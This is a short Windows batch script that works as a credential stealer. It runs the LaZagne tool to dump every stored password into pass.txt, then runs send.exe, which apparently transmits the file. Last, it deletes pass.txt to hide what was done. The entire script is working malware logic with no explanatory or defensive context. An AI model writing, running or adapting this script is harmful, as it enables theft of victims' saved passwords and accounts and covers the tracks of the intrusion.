@echo off
lazagne.exe all > pass.txt
send.exe
del /s "pass.txt"